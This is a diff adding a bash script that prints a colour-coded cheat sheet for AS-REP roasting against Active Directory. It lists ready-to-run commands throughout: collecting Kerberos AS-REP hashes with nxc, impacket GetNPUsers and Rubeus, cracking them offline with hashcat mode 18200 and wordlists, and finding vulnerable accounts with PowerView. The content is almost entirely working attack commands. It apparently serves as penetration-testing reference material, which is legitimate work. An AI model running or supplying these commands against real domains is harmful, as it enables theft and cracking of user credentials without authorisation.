@@ -1,0 +1,44 @@
+#!/bin/bash
+BOLD='\033[1m'
+CYAN='\033[36m'
+GREEN='\033[32m'
+YELLOW='\033[33m'
+BLUE='\033[34m'
+NC='\033[0m'
+
+printf "\n"
+echo -e "${BOLD}${YELLOW}── AS-REP ROASTING ──────────────────────────────────${NC}"
+printf "\n"
+
+echo -e "  Note: Targets users with \"Do not require Kerberos preauthentication\" enabled."
+echo -e "  Note: No credentials needed if you have a user list."
+printf "\n"
+
+echo -e "${BOLD}${CYAN}── Collect AS-REP Hashes ────────────────────────────${NC}"
+echo -e "  Note: nxc — primary:"
+echo -e "  ${GREEN}nxc ldap <DC_IP> -u users.txt -p '' --asreproast asrep.txt --kdcHost <DC_IP>${NC}"
+echo -e "  ${GREEN}nxc ldap <DC_IP> -u <USER> -p <PASS> --asreproast asrep.txt${NC}"
+printf "\n"
+echo -e "  Note: impacket — no creds, user list:"
+echo -e "  ${GREEN}impacket-GetNPUsers DOMAIN/ -usersfile users.txt -format hashcat -outputfile asrep.txt${NC}"
+echo -e "  ${GREEN}GetNPUsers.py -request -format hashcat -outputfile asrep.txt -dc-ip <DC> 'DOMAIN/'${NC}"
+printf "\n"
+echo -e "  Note: Rubeus — on Windows target:"
+echo -e "  ${GREEN}.\\Rubeus.exe asreproast /format:hashcat /outfile:asrep.txt${NC}"
+printf "\n"
+
+echo -e "${BOLD}${CYAN}── Crack ────────────────────────────────────────────${NC}"
+echo -e "  ${GREEN}hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt${NC}"
+echo -e "  ${GREEN}hashcat -m 18200 asrep.txt rockyou.txt -r /usr/share/hashcat/rules/best64.rule${NC}"
+printf "\n"
+
+echo -e "${BOLD}${CYAN}── Hash Format ──────────────────────────────────────${NC}"
+echo -e "  ${GREEN}"'$krb5asrep$23$user@DOMAIN:<hash>...<hash>'"${NC}"
+printf "\n"
+
+echo -e "${BOLD}${CYAN}── Find AS-REP Roastable Users (PowerView) ──────────${NC}"
+echo -e "  ${GREEN}Get-DomainUser -PreauthNotRequired | select SamAccountName${NC}"
+printf "\n"
+
+printf "\n"
+echo -e "${YELLOW}─────────────────────────────────────────────────────${NC}"
